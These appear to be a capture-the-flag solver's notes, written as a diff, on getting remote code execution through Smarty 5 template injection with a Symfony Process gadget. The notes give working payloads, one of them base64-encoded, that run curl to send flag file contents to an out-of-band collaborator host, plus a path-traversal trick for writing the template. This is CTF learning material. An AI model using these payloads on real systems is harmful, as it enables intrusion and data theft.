@@ -1,0 +1,52 @@
+Writeup using PHP gadgets to get RCE: https://ireland.re/posts/idekctf_2024/
+    - the reason this works is because we're creating a template variable named
+    "foo" that is why we do "assign var=foo" and then we assign a value to that template
+    "value="
+    * thing is this is using Smarty5 which means all tags that lead to RCE are removed (directly)
+    such as {PHP}, system, and include_php.
+    but staticMethods can still be called with this syntax:
+        - {assign var=foo value=\Path\To\Folder::StaticMethod()}
+    
+    - If we look at the Dockerfile Symphony is being installed, if we go into the app_vendor file 
+    and use 'grep -ri "Symphony" .' we can explore the source code until we find
+    a process.php that has a method that allows us to run system commands.
+    If we read the code we have to do ->run() to actually execute that function for this specific gadget.
+
+    - {assign var=foo value=\Symfony\Component\Process\Process::fromShellCommandline('curl http://BURP-COLLABORATOR/$(cat /flag* | base64)')->run()}
+
+
+- now we need to write this template, we know that everything gets written to template_c (all unique) only if it's a valid template.
+
+?page=PAYLOAD/../home
+
+one issue, we have to base64 encode our payload or the dots and slashes will cause issues even if they're URL-encoded.
+
+documentation shows us how to do it:
+https://smarty-php.github.io/smarty/stable/api/resources/#the-string-and-eval-resources
+
+"
+From within a Smarty template:
+
+
+ {include file="string:urlencode:$template_string_urlencode"} {* will decode string using urldecode() *}
+ {include file="eval:base64:$template_string_base64"} {* will decode string using base64_decode() *}
+"
+
+* this is like JS eval() or python's eval()
+so let's add our payload
+raw: {assign var=foo value=\Symfony\Component\Process\Process::fromShellCommandline('curl https://BURP-collab/$(cat /flag* | base64)')->run()}
+
+{include file="eval:base64:<base64 encoded BLOB>"}
+
+the reason we have to base64 the flag is because of special characters and we don't know how that'll affect the HTTP request 
+with curl.
+
+
+
+{assign var=foo value=\Symfony\Component\Process\Process::fromShellCommandline('curl https://0rsrswbk4xp7bqalxd7m5zvnve15p7dw.oastify.com/$(cat /flag* | base64)')->run()}
+
+
+{include file="eval:base64:e2Fzc2lnbiB2YXI9Zm9vIHZhbHVlPVxTeW1mb255XENvbXBvbmVudFxQcm9jZXNzXFByb2Nlc3M6OmZyb21TaGVsbENvbW1hbmRsaW5lKCdjdXJsIGh0dHBzOi8vMHJzcnN3Yms0eHA3YnFhbHhkN201enZudmUxNXA3ZHcub2FzdGlmeS5jb20vJChjYXQgL2ZsYWcqIHwgYmFzZTY0KScpLT5ydW4oKX0="}
+
+Moreover, to get the template filename they're hashed using SHA, just use your docker instance to get the file name
+and you'll be able to access it on the server's CTF.
